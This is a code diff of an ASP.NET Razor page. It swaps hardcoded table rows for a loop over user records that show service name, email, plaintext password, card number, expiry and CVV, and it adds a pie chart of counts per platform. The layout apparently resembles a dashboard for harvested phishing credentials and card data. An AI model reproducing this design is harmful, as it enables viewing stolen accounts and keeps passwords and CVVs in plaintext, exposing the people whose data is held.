@@ -1,4 +1,5 @@
-﻿@{
+﻿@model List<UserModel>
+@{
     Layout = "_Layout";
 }
 
@@ -23,30 +24,17 @@ $(document).ready(function (){
             </tr>
         </thead>
         <tbody>
-            <tr>
-                <td>Epic Games</td>
-                <td>tiger_nixon_66@gmail.com</td>
-                <td>crazytiger99</td>
-                <td>5406340323094567</td>
-                <td>04/25</td>
-                <td>320</td>
-            </tr>
-            <tr>
-                <td>Netflix</td>
-                <td>garrettwinters_34@gmail.com</td>
-                <td>coolgarret12345</td>
-                <td>5406234223679854</td>
-                <td>02/29</td>
-                <td>610</td>
-            </tr>
-        <tr>
-            <td>Google Cloud</td>
-            <td>ashleysmith59@gmail.com</td>
-            <td>ashleysmithtoronto</td>
-            <td>5406784567234567</td>
-            <td>08/26</td>
-            <td>725</td>
-        </tr>
+           @foreach(var item in Model)
+           {
+               <tr>
+                   <td>@item.PlatformName</td>
+                   <td>@item.UserEmail</td>
+                   <td>@item.UserPassword</td>
+                   <td>@item.UserCC</td>
+                   <td>@item.UserDate</td>
+                   <td>@item.UserCVV</td>
+               </tr>
+           }
         </tbody>
                 
     </table>
@@ -60,10 +48,8 @@ $(document).ready(() => {
         height: 350,
         type: "pie",
       },
-      dataLabels: {
-        enabled: false
-      },
-      series: [44, 55, 13, 33]
+      labels: ["Google", "Epic", "Netflix"],
+      series: [@ViewBag.PlatformCounts[1], @ViewBag.PlatformCounts[2], @ViewBag.PlatformCounts[3]],
     }
     const chart = new ApexCharts(
       document.querySelector("#pie"),
